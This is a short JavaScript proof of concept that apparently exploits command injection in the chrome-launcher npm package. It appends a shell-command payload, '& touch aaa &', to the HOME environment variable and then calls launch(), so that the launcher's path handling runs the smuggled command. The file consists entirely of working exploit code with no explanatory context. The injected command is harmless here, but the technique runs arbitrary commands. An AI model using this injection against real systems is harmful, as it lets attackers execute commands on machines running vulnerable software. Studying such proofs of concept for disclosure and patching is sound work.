var malicious_code = "& touch aaa &";
process.env.HOME += "/" + malicious_code;
var Root = require("chrome-launcher");
Root.launch();
